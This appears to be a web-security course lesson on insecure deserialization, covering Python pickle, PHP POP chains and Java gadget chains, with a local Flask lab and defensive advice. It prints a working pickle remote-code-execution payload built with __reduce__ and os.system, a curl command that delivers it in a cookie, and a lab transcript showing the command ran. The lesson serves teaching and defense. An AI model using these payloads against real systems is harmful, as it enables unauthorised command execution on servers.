---
title: "Lesson 8.2: Insecure Deserialization"
image:
  path: /assets/img/covers/web-8-2-insecure-deserialization.webp
  alt: "Insecure Deserialization"
date: 2024-06-15 16:10:00 +0700
categories: ["Web Security", "Web · Template and Deserialization"]
tags: [web, deserialization, rce]
render_with_liquid: false
---

By the end of this lesson you understand why calling `pickle.loads` on a cookie hands an attacker full command execution, and why PHP and Java instead need a gadget chain. Serialization turns an object into bytes, and for many formats rebuilding that object runs code rather than just loading data.

![Insecure Deserialization](/assets/img/web/web-8-2-insecure-deserialization.svg)
_An attacker-controlled pickle in a cookie reaches pickle.loads, whose __reduce__ step calls os.system directly._

Part: 8 (Template and Deserialization) | Time: about 50 minutes | Difficulty: advanced

**Prerequisites:** HTTP, cookies, and the general idea of serialize and deserialize.

**Tools:** Python, curl, ysoserial (Java), phpggc (PHP).

## Goals

After this lesson you understand serialize and deserialize and why deserializing untrusted data is dangerous. You can write a pickle RCE payload with `__reduce__`, know how PHP `unserialize` (POP chain) and Java `readObject` differ, and build a Flask lab that accepts a pickle through a cookie and runs a real command.

## 1. Theory

Serialize turns an in-memory object into a byte string to store or transmit; deserialize rebuilds the object from bytes. That sounds harmless, but for many formats (Python pickle, PHP serialize, Java serialization, .NET BinaryFormatter) the rebuilding step does not just load data into fields, it runs code: it calls constructors, invokes magic methods, executes opcodes. If the data comes from somewhere untrusted (a cookie, a request body, a queue, a cache), the attacker controls the code that runs.

### Python pickle: the most dangerous and the easiest

The pickle format is really a small program for a tiny stack virtual machine, with a `REDUCE` opcode that calls a callable with arguments. Each object can declare how it is rebuilt through the `__reduce__` method, which returns `(callable, args)`:

```python
import os, pickle, base64
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))
payload = base64.b64encode(pickle.dumps(RCE()))
```

When the server runs `pickle.loads(payload)`, it calls `os.system("id")`. No complex gadget like Java or PHP is needed, only `pickle.loads` on data you control. The short rule follows: **never unpickle data from the outside.** `pickle`, `cPickle`, `dill`, `shelve`, and `yaml.load` (without `SafeLoader`) are all affected.

One point that often confuses people is that the command output does not return to the HTTP response on its own, because the unpickled value is the result of `os.system`, which is an exit code (an integer). To see the output, the payload writes to a file and reads it back, or uses an out-of-band channel (sending it to your own server). The lab uses the write-to-file approach as proof.

### PHP `unserialize`: needs a POP chain

PHP `unserialize()` rebuilds an object from a string that describes its properties. It does not call an arbitrary function immediately, but when the object is built and then destroyed, PHP calls magic methods: `__wakeup()` during unserialize, `__destruct()` on cleanup, `__toString()` on string coercion. The attacker chains classes that already exist in the app or framework so that the sequence of magic methods leads to a dangerous action (writing a file, calling `system`). That chain is called a POP chain (Property-Oriented Programming). The tool `phpggc` ships hundreds of chains for Laravel, Symfony, WordPress and more. A sign is a base64 parameter that starts with `O:` or `a:` after decoding.

### Java / .NET

Java `ObjectInputStream.readObject()` on external data is the classic vulnerability. The exploit uses gadgets in libraries on the classpath (Commons-Collections, Spring and others); the tool `ysoserial` generates payloads ready to use. .NET has `BinaryFormatter`, `LosFormatter`, and Json.NET's `TypeNameHandling` with `ysoserial.net`. The principle is the same: deserialization runs code, and the attacker chains gadgets.

## 2. Demo

```text
# build a pickle payload (Python)
python3 -c 'import os,pickle,base64;\
class R:\
 def __reduce__(self): return (os.system,("id > /tmp/proof 2>&1",))\
print(base64.b64encode(pickle.dumps(R())).decode())'

# send it through a cookie
curl --cookie "prefs=<base64 payload>" http://target/
# -> server runs pickle.loads -> runs the command
```

To tell that an app uses pickle: the cookie or token is base64, and decoding it shows bytes starting with `\x80\x04` (protocol 4) or strings like `posix`, `system`, or a class name.

## 3. Lab

- Vulnerable app: `labs/8.2/` (Flask, run `python3 app.py`, listening on `127.0.0.1:8065`).
- Task: take the default `prefs` cookie (base64 pickle), then replace it with a `__reduce__` payload to run a command.
- Hint: the app does `pickle.loads(base64.b64decode(cookie))`. The output does not come back in the response, so write it to a file and read it.
- Solution: `labs/8.2/exploit.py` and `labs/8.2/transcript.txt`.

Real transcript excerpt:

```text
=== [2] Gui cookie prefs = payload -> server pickle.loads -> RCE ===
Server tra ve: Prefs cua ban: 0 (0 = exit code cua os.system)
=== [3] Doc file bang chung /tmp/lab82_proof.txt (lenh da chay THAT) ===
uid=1000(haipanda) gid=1000(Administrator) groups=1000(Administrator),4(adm)...
--- uname ---
Linux Haind 6.18.54.1-microsoft-standard-WSL2 ...
```

## 4. Common pitfalls

- Thinking pickle just "reads data". It is a program, so reading it runs it.
- Waiting for output in the response. You have to arrange a separate channel to collect the output.
- Defense (root cause): use JSON for data that crosses a trust boundary, not pickle. If binary serialization is truly required, sign the data with HMAC to detect tampering, and still avoid pickle. PHP: use `json_decode` instead of `unserialize`, or `unserialize($x, ['allowed_classes'=>false])`. Java: avoid `readObject` on external data and enable `ObjectInputFilter`.

## 5. Further reading

- PortSwigger Web Security Academy: Insecure deserialization.
- Tools: ysoserial (Java), phpggc (PHP), ysoserial.net (.NET).
- Python docs: the safety warning in the `pickle` module.

## 6. Key takeaways

- Deserializing many formats runs code, it does not just load data.
- Python pickle: `__reduce__` returning `(os.system, ("cmd",))` is enough for RCE.
- Never unpickle (or `yaml.load` without safe mode) data from the outside.
- PHP: POP chain through magic methods, using phpggc. Java: ysoserial.
- Pickle output does not return to the response on its own, so write a file or use an OOB channel.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 8.2</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/8.2.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/8.2/app.py" download><i class="fa-solid fa-file-code"></i>app.py</a>
<a class="lab-file" href="/assets/labs-web/8.2/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
</div>
</div>
